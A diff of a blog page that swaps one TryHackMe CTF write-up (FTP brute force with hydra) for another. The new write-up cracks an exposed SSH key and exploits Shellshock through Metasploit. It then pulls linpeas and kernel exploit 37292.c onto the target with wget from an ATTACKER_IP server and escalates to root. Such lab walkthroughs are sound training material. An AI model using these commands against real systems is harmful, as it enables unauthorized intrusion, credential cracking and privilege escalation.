@@ -58,24 +58,22 @@
 
 
  <div class="terminal-block">
-<a href="images/netsec/ns1.jpg" target="_blank">
-<img src="images/netsec/ns1.jpg">
+<a href="images/0day/day1.jpg" target="_blank">
+<img src="images/0day/day1.jpg">
 </a>
 </div>
     
-<p>Alrighty, today I’ll be doing a quick little writeup for the Net Sec Challenge TryHackMe CTF.</p>
+<p>Another medium challenge! Let’s dive straight into it, this should be fun…</p>
 
-<p>Like usual, I’m gonna start by opening a webpage with the provided IP.</p>
+<p>Bringing myself to the website, I’m greeted with what looks like a portfolio of some sort.</p>
 
 <div class="terminal-block">
-<a href="images/netsec/ns2.jpg" target="_blank">
-<img src="images/netsec/ns2.jpg">
+<a href="images/0day/day2.jpg" target="_blank">
+<img src="images/0day/day2.jpg">
 </a>
 </div>
 
-<p>Cool, this is all we’re working with right now. Lovely.</p>
-
-<p>I’m gonna spin up a good ol’ nmap command to see what ports we have open.</p>
+<p>I’ll use nmap to see what ports are open, like normal.</p>
 
   <div class="terminal-block">
 <pre><code class="language-bash">
@@ -83,97 +81,262 @@ nmap -sC -sV -p- TARGET_IP
 </code></pre>
 </div>
 
+<p>I used -p- here to scan all ports because sometimes these THM boxes require a full scan.</p>
+
+    <p>In the meantime, I’ll check out the source code.</p>
+
+    <p>Nothing interesting, just JS scripts for animation, really.</p>
+    
 <div class="terminal-block">
-<a href="images/netsec/ns3.jpg" target="_blank">
-<img src="images/netsec/ns3.jpg">
+<a href="images/0day/day3.jpg" target="_blank">
+<img src="images/0day/day3.jpg">
 </a>
 </div>
 
-<p>Off the bat, something stands out to me. I already see some flags. We have SSH-2.0-OpenSSH_8.2p1 {FLAG}, http-server-header {FLAG}, as well as \.2p1\x20 {FLAG}</p>
+<p>Going back to nmap, nothing important is really displayed here for us.</p>
 
-<p>We also have a few ports that stand out to us. 139, 445, 8080, and 10021.</p>
-  
-<p>Continuing, I’ll do some research on Samba smbd, since port 139 and 445 use that. Looks like Samba smbd is a file and printer sharing daemon. We’ll keep this in mind.</p>
-
-<p>(note: i noticed the ftp version on my nmap scan too, this might come in use later)</p>
-
-<p>Now, I’ll try and load port 8080 on the website and see if we have anything there. Also note that it’s using Node.js, this could be important.</p>
-
+<p>I’ll use gobuster next to see if I can find any hidden directories.</p>
 
 <div class="terminal-block">
-<a href="images/netsec/ns4.jpg" target="_blank">
-<img src="images/netsec/ns4.jpg">
+<a href="images/0day/day4.jpg" target="_blank">
+<img src="images/0day/day4.jpg">
 </a>
 </div>
 
-<p>Okay, this just looks like some informational stuff for the box, not necessarily something we can exploit.</p>
+<p>Alright, we got some good stuff here. Specifically, admin, uploads, backup, and secret. I’ll navigate to the obvious first, /admin. </p>
 
-<p>Now i’m thinking, hm, what could possibly be left for us to do? That’s when I remembered there was an ftp port open, and the next question for us gives us usernames. </p>
+<p>...Nothing...</p>
 
-<p>I tried logging into ftp with both users provided to us with empty passwords, but to no avail. We’ll need to brute force these accounts.</p>
+<p>Nothing in /uploads either.</p>
 
-<p>I created a file named users.txt which included both of the usernames given to us.</p>
+<p>/secret gave us an image of a turtle. I downloaded it and tried using steghide and binwalk but there was nothing there.</p>
 
-<p>I’ll be using hydra in this example.</p>
+<p>/backup gave us something interesting though, a private RSA key.</p>
 
-<div class="terminal-block">
+    <p>Since this is pretty much the only foothold we have, I’ll copy the key and paste it into an id_rsa file.</p>
+
+    <p>Make it executable.</p>
+
+      <div class="terminal-block">
 <pre><code class="language-bash">
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -s 10021
+chmod 600 id_rsa
 </code></pre>
 </div>
 
-<p>-s specifies the port at which we’re bruteforcing.</p>
+    <p>Something I noticed in the text of the private key, is that it is encrypted. For this, we’ll use ssh2john to crack it.</p>
 
+<div class="terminal-block">
+<pre><code class="language-bash">
+ssh2john id_rsa > hash.txt
+john hash.txt –wordlists=/usr/share/wordlists/rockyou.txt
+</code></pre>
+</div>
+
+<div class="terminal-block">
+<a href="images/0day/day5.jpg" target="_blank">
+<img src="images/0day/day5.jpg">
+</a>
+</div>
+
+<p>Nice. We have a password.</p>
+
+    <p>Since we don’t have a username to ssh into yet, this will kinda be useless to us.</p>
+
+    <p>Alright, after looking further, I decided that I’m gonna use nikto to scan the website for vulnerabilities.</p>
+
+<div class="terminal-block">
+<a href="images/0day/day6.jpg" target="_blank">
+<img src="images/0day/day6.jpg">
+</a>
+</div>
+
+<p>Hm, most of this is useless to us. BESIDES THIS ONE LINE…. “Site appears vulnerable to the shellshock vulnerability.” </p>
+
+    <p>For this, I’ll use metasploit to get a good explanation of this exploit.</p>
+
+
+<div class="terminal-block">
+<pre><code class="language-bash">
+msfconsole
+    
+search shellshock
+</code></pre>
+</div>
+
+<div class="terminal-block">
+<a href="images/0day/day7.jpg" target="_blank">
+<img src="images/0day/day7.jpg">
+</a>
+</div>
+
+<p>Well we know that our target is using Apache, as shown in the nmap scan, as well as there being a cgi-bin directory, so option 1 would be the best for us here.</p>
+
+    
+<div class="terminal-block">
+<pre><code class="language-bash">
+use 1
+</code></pre>
+</div>
+
+<p>Now we need to set up our parameters for this to actually execute.</p>
+
+    <div class="terminal-block">
+<pre><code class="language-bash">
+set RHOSTS TARGET_IP
+
+set LHOSTS tun0 (tun0 is our VPN IP)
+</code></pre>
+</div>
+
+    <p>Now when trying to find the target script to use, I went back to our nikto scan where we can find /cgi-bin/test.cgi. I’ll use this for our target script.</p>
+
+        <div class="terminal-block">
+<pre><code class="language-bash">
+Set TARGETURI /cgi-bin/test.cgi
+</code></pre>
+</div>
+
+
+<div class="terminal-block">
+<a href="images/0day/day8.jpg" target="_blank">
+<img src="images/0day/day8.jpg">
+</a>
+</div>
+
+    
+<p>Now all we need to do is run it.</p>
   
+     <div class="terminal-block">
+<pre><code class="language-bash">
+run
+</code></pre>
+</div>
+
+<p>We need a shell now that it has run, we can create one with the shell command.</p>
+
+    <p>Now, we need to actually SPAWN the shell. I’ll use a basic python shell for this.</p>
+
+         <div class="terminal-block">
+<pre><code class="language-bash">
+python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+</div>
+
+    <p>Awesome, we have a shell now.</p>
+
+    <p>I assume this is where user.txt will be, so I’ll take a quick look around the file system to find it.</p>
+
+
 <div class="terminal-block">
-<a href="images/netsec/ns5.jpg" target="_blank">
-<img src="images/netsec/ns5.jpg">
+<a href="images/0day/day9.jpg" target="_blank">
+<img src="images/0day/day9.jpg">
 </a>
 </div>
 
-<p>Yayyyy we found both passwords. Now we need to look inside to see what we have.</p>
+<p>Bingo.</p>
 
-<div class="terminal-block">
-<a href="images/netsec/ns6.jpg" target="_blank">
-<img src="images/netsec/ns6.jpg">
+<p>Alright, now it’s time for privilege escalation. I’ll save yall time and go through the system myself to try and find anything.
+</p>
+
+<p>After about half an hour of searching, I didn’t really find anything interesting. From here, I decided to boot up linpeas to see if it could expose any extra information to me.</p>
+
+            <div class="terminal-block">
+<pre><code class="language-bash">
+On my kali box:
+Python3 -m http.server 8000
+
+On user box:
+Cd /tmp
+
+Wget http://ATTACKER_IP:8000/linpeas.sh
+
+Making it executable:
+Chmod +x linpeas.sh
+
+Running it:
+./linpeas.sh
+</code></pre>
+</div>   
+
+    <div class="terminal-block">
+<a href="images/0day/day10.jpg" target="_blank">
+<img src="images/0day/day10.jpg">
 </a>
 </div>
 
-<p>Lovely, let’s read that and get the flag.</p>
+    <p>Now we’re gonna look for any headers that include “Privilege escalation”.</p>
 
-<div class="terminal-block">
-<a href="images/netsec/ns7.jpg" target="_blank">
-<img src="images/netsec/ns7.jpg">
+    <p>Thankfully, it didn’t take me long to find one, it was actually one of the first headers.</p>
+
+        <div class="terminal-block">
+<a href="images/0day/day11.jpg" target="_blank">
+<img src="images/0day/day11.jpg">
 </a>
 </div>
 
-<p>Awesome, we have that flag now. Let’s move onto the next step.</p>
+    <p>I’m gonna do a quick google search to find a privilege escalation script we can run for this OS.</p>
 
-<p>“Browsing to http://10.82.184.168:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?”</p>
-
-<div class="terminal-block">
-<a href="images/netsec/ns8.jpg" target="_blank">
-<img src="images/netsec/ns8.jpg">
+            <div class="terminal-block">
+<a href="images/0day/day12.jpg" target="_blank">
+<img src="images/0day/day12.jpg">
 </a>
 </div>
 
-<p>Oops. My nmap scan was too loud. Let me reset the packet count and try again running a quieter and stealthier scan.</p>
-  
-<p>Nmap -sS <TARGET_IP> yielded similar results, we’re gonna have to be super sneaky.</p>
+    <p>Before uploading the picture on this writeup, I saw this ExploitDB link where I found what I believe would work for this OS. That being said, lets copt it over to the target’s machine.</p>
 
-<p>For our next try, I’ll use nmap -sN TARGET_IP</p>
+    <p>I used searchsploit to download it manually.</p>
 
-<div class="terminal-block">
-<a href="images/netsec/ns9.jpg" target="_blank">
-<img src="images/netsec/ns9.jpg">
+
+          <div class="terminal-block">
+<pre><code class="language-bash">
+searchsploit 37292.c (found on exploitDB)
+
+searchsploit -m exploits/linux/local/37292.c
+</code></pre>
+</div>
+
+    <p>Now I’ll host an http server on port 8001 to transfer the file to the target machine.</p>
+
+    
+          <div class="terminal-block">
+<pre><code class="language-bash">
+python3 -m http.server 8001
+
+Now on the target:
+
+wget http://ATTACKER_IP:8001/37292.c
+</code></pre>
+</div>
+
+             <div class="terminal-block">
+<a href="images/0day/day13.jpg" target="_blank">
+<img src="images/0day/day13.jpg">
 </a>
 </div>
 
-<p>We got it!</p>
+    <p>Awesome sauce.</p>
 
-<p>This was a relatively easy CTF, where understanding nmap and nmap port scanning basics, port scanning reconnaissance, along with ftp services, and password bruteforcing. These topics are extremely valuable and important in almost every (or most) CTF setting, along with real life situations and enumeration.</p>
+    <p>Now all thats left is compiling it and running it.</p>
 
-<p>Although it is a Medium box, this challenge shows how misconfigured services, as well as weak credentials can still be used as common attack vectors. Consistent reconnaissance, methodical testing, and adapting scan techniques is what led to retrieving all flags at the end.</p>
+    <div class="terminal-block">
+<pre><code class="language-bash">
+Gcc 37292.c -o 37292.c
+
+./37292.c
+</code></pre>
+</div>
+
+    <div class="terminal-block">
+<a href="images/0day/day14.jpg" target="_blank">
+<img src="images/0day/day14.jpg">
+</a>
+</div>
+
+    <p>Beautiful.</p>
+
+    <p>This writeup was a great teacher for metasploit, as well as linpeas! Personally those are two things I lack in quite a bit, so this CTF definitely put me in a better position.</p>
+
+    <p>I hope this was easy to follow, I think I did a great job explaining things!</p>
 
 <hr class="divider">
 
